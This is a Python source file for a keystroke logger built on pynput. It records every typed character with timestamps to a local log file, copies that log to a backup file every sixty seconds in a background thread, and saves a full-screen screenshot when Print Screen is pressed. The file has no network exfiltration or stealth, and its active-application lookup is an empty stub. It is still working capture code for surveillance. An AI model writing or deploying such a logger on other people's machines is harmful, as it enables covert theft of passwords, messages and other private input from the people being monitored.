from pynput import keyboard, mouse
import time
import threading
import subprocess
from PIL import ImageGrab

log_file = 'keystrokes_log.txt'
backup_file = 'backup_log.txt'
screenshot_folder = 'screenshots/'

current_word = ""
current_line = ""
current_application = ""
backup_interval = 60  # Backup every 60 seconds
screenshot_key = keyboard.Key.print_screen  # Change to the desired key combination

def on_key_press(key):
    global current_word, current_line, current_application

    try:
        if key == screenshot_key:
            capture_screenshot()
        elif hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            current_word += " "
        elif key == keyboard.Key.enter:
            current_word += "\n"
            current_line += current_word
            current_word = ""
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                current_line += current_word + " "
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                current_line += current_word + "\n"
                current_word = ""
    
    if len(current_line) >= 50:  # Adjust the threshold as needed
        save_current_line()

def save_current_line():
    global current_line
    if current_line:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Application: {current_application}\n')
                f.write(current_line)
                f.write("\n")
            current_line = ""
        except Exception as e:
            print("Error writing to file:", e)

def backup_data():
    while True:
        save_current_line()
        try:
            with open(log_file, 'r') as source, open(backup_file, 'w') as target:
                target.write(source.read())
        except Exception as e:
            print("Error backing up data:", e)
        time.sleep(backup_interval)

def get_active_application():
    try:
        # Implement code here to get the active application name
        # For Linux, you can use the 'xdotool' command-line tool to get the active window's name
        pass
    except Exception as e:
        print("Error getting active application:", e)

def capture_screenshot():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = f"{screenshot_folder}screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        print("Screenshot saved:", screenshot_path)
    except Exception as e:
        print("Error capturing screenshot:", e)

def main():
    global current_application
    current_application = get_active_application()
    
    backup_thread = threading.Thread(target=backup_data)
    backup_thread.daemon = True
    backup_thread.start()
    
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
